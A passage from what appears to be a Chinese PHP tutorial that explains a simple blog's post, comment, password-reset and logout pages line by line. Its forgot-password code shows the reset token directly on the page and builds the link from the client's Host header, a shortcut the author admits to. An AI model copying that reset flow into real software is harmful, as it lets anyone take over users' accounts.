class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">if</span> (<span class="title">isLoggedIn</span>()): ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">dashboard</span>/&quot;&gt;控制台&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">logout</span>.<span class="title">php</span>&quot;&gt;退出&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot;&gt;登录&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot;&gt;注册&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">article</span> <span class="title">class</span>=&quot;<span class="title">post</span>-<span class="title">full</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h1</span>&gt;&lt;?= <span class="title">htmlspecialchars</span>($<span class="title">post</span>[&#x27;<span class="title">title</span>&#x27;]) ?&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">post</span>-<span class="title">meta</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                作者: &lt;?= <span class="title">htmlspecialchars</span>($<span class="title">post</span>[&#x27;<span class="title">username</span>&#x27;]) ?&gt; | </span></span><br><span class="line"><span class="class">                发布时间: &lt;?= <span class="title">date</span>(&#x27;<span class="title">Y</span>-<span class="title">m</span>-<span class="title">d</span> <span class="title">H</span>:<span class="title">i</span>&#x27;, <span class="title">strtotime</span>($<span class="title">post</span>[&#x27;<span class="title">created_at</span>&#x27;])) ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">post</span>-<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;?= <span class="title">nl2br</span>(<span class="title">htmlspecialchars</span>($<span class="title">post</span>[&#x27;<span class="title">content</span>&#x27;])) ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">article</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">section</span> <span class="title">class</span>=&quot;<span class="title">comments</span>-<span class="title">section</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span>&gt;评论 (&lt;?= <span class="title">count</span>($<span class="title">comments</span>) ?&gt;)&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">if</span> (<span class="title">isLoggedIn</span>()): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">class</span>=&quot;<span class="title">comment</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">textarea</span> <span class="title">name</span>=&quot;<span class="title">content</span>&quot; <span class="title">placeholder</span>=&quot;写下您的评论...&quot; <span class="title">required</span>&gt;&lt;/<span class="title">textarea</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>&quot;&gt;发表评论&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot;&gt;登录&lt;/<span class="title">a</span>&gt;后即可发表评论&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">comments</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">foreach</span>($<span class="title">comments</span> <span class="title">as</span> $<span class="title">comment</span>): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">comment</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">comment</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">strong</span>&gt;&lt;?= <span class="title">htmlspecialchars</span>($<span class="title">comment</span>[&#x27;<span class="title">username</span>&#x27;]) ?&gt;&lt;/<span class="title">strong</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">span</span>&gt;&lt;?= <span class="title">date</span>(&#x27;<span class="title">Y</span>-<span class="title">m</span>-<span class="title">d</span> <span class="title">H</span>:<span class="title">i</span>&#x27;, <span class="title">strtotime</span>($<span class="title">comment</span>[&#x27;<span class="title">created_at</span>&#x27;])) ?&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">comment</span>-<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;?= <span class="title">nl2br</span>(<span class="title">htmlspecialchars</span>($<span class="title">comment</span>[&#x27;<span class="title">content</span>&#x27;])) ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endforeach</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">section</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>逐行分析一下。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$postId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="number">0</span>;</span><br></pre></td></tr></table></figure><ul><li>获取URL参数，空合并运算符，避免未定义错误。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    SELECT p.*, u.username </span></span><br><span class="line"><span class="string">    FROM posts p </span></span><br><span class="line"><span class="string">    JOIN users u ON p.author_id = u.id </span></span><br><span class="line"><span class="string">    WHERE p.id = ?</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>]);</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br></pre></td></tr></table></figure><ul><li>与上面讲述过的类似，首先准备SQL查询语句，之后替换<code>?</code>为文章ID，最后从查询结果中获取一行数据。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable">$post</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 404 Not Found&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文章不存在&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>文章不存在时返回404错误。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    SELECT c.*, u.username </span></span><br><span class="line"><span class="string">    FROM comments c </span></span><br><span class="line"><span class="string">    JOIN users u ON c.user_id = u.id </span></span><br><span class="line"><span class="string">    WHERE c.post_id = ? </span></span><br><span class="line"><span class="string">    ORDER BY c.created_at DESC</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>]);</span><br><span class="line"><span class="variable">$comments</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br></pre></td></tr></table></figure><ul><li>获取评论，与获取文章的方式大同小异，需要注意的时<code>$stmt-&gt;fetchAll();</code>这里时直接获取所有的评论，不仅仅只是一行数据。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处理评论提交</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="title function_ invoke__">isLoggedIn</span>()) &#123;</span><br></pre></td></tr></table></figure><ul><li><strong>条件判断</strong>：只有当同时满足以下两个条件时才执行评论提交。<ul><li>请求方法是 POST（通常是表单提交）。</li><li>用户已登录（<code>isLoggedIn()</code>返回 true）。</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li>从POST请求中获取用户提交的评论内容。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO comments (post_id, user_id, content) VALUES (?, ?, ?)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>], <span class="variable">$content</span>]);</span><br></pre></td></tr></table></figure><ul><li>依旧使用预处理语句防止SQL注入，与前面的过程一致。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: post.php?id=<span class="subst">$postId</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><ul><li>页面重定向，评论提交成功后跳转回文章首页，<code>exit</code>确保脚本立即终止，避免后续代码执行。</li></ul><h4 id="2-5-forgot-password-php（密码找回功能）"><a href="#2-5-forgot-password-php（密码找回功能）" class="headerlink" title="2.5 forgot-password.php（密码找回功能）"></a>2.5 <code>forgot-password.php</code>（密码找回功能）</h4><ul><li>这个页面用做找回密码。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/auth.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">generateResetToken</span>(<span class="variable">$email</span>, <span class="variable">$pdo</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$token</span>) &#123;</span><br><span class="line">        <span class="comment">// 在实际应用中，这里应该发送邮件</span></span><br><span class="line">        <span class="variable">$resetLink</span> = <span class="string">&quot;http://&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] . <span class="string">&quot;/reset-password.php?token=&quot;</span> . <span class="variable">$token</span>;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&quot;重置链接已发送到您的邮箱: &quot;</span> . <span class="variable">$resetLink</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&quot;邮箱不存在或发送失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;找回密码 - 我的博客&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;nav&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;我的博客&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span>-<span class="title">links</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot;&gt;登录&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot;&gt;注册&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">container</span> <span class="title">auth</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span>&gt;找回密码&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">message</span>): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;&lt;?= $<span class="title">message</span> ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">class</span>=&quot;<span class="title">auth</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">email</span>&quot;&gt;请输入您的邮箱:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">email</span>&quot; <span class="title">id</span>=&quot;<span class="title">email</span>&quot; <span class="title">name</span>=&quot;<span class="title">email</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>&quot;&gt;发送重置链接&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot;&gt;返回登录&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>引用其他文件和初始化信息变量这里不再赘述。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br></pre></td></tr></table></figure><ul><li>检查是否是表单提交请求。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">generateResetToken</span>(<span class="variable">$email</span>, <span class="variable">$pdo</span>);</span><br></pre></td></tr></table></figure><ul><li>获取用户邮箱并生成密码重置令牌，令牌机制可以避免直接修改密码更加安全。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$token</span>) &#123;</span><br><span class="line">    <span class="variable">$resetLink</span> = <span class="string">&quot;http://&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] . <span class="string">&quot;/reset-password.php?token=&quot;</span> . <span class="variable">$token</span>;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;重置链接已发送到您的邮箱: &quot;</span> . <span class="variable">$resetLink</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>生成充值链接并提示用户，但是这里实现的话需要更加繁琐的步骤，所以我将它直接回显在页面上，实际应用的情况下，时通过邮箱发送到用户的邮箱里。</li></ul><h4 id="2-6-logout-php（用户退出）"><a href="#2-6-logout-php（用户退出）" class="headerlink" title="2.6 logout.php（用户退出）"></a>2.6 <code>logout.php</code>（用户退出）</h4><ul><li>这个时用户点击退出时跳转到的页面。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// logout.php - 用户注销功能</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记录注销日志</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$logout_time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">    <span class="variable">$log_message</span> = <span class="string">&quot;用户 <span class="subst">&#123;$username&#125;</span> 于 <span class="subst">&#123;$logout_time&#125;</span> 注销\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建日志目录（如果不存在）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;logs&#x27;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;logs&#x27;</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 记录到文件</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;logs/logout.log&#x27;</span>, <span class="variable">$log_message</span>, FILE_APPEND | LOCK_EX);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 销毁所有会话变量</span></span><br><span class="line"><span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除会话cookie</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;session.use_cookies&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$params</span> = <span class="title function_ invoke__">session_get_cookie_params</span>();</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="title function_ invoke__">session_name</span>(), <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">42000</span>,</span><br><span class="line">        <span class="variable">$params</span>[<span class="string">&quot;path&quot;</span>], <span class="variable">$params</span>[<span class="string">&quot;domain&quot;</span>],</span><br><span class="line">        <span class="variable">$params</span>[<span class="string">&quot;secure&quot;</span>], <span class="variable">$params</span>[<span class="string">&quot;httponly&quot;</span>]</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 销毁会话</span></span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;退出成功 - 我的博客&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        <span class="comment">/* 添加特定于注销页面的样式 */</span></span><br><span 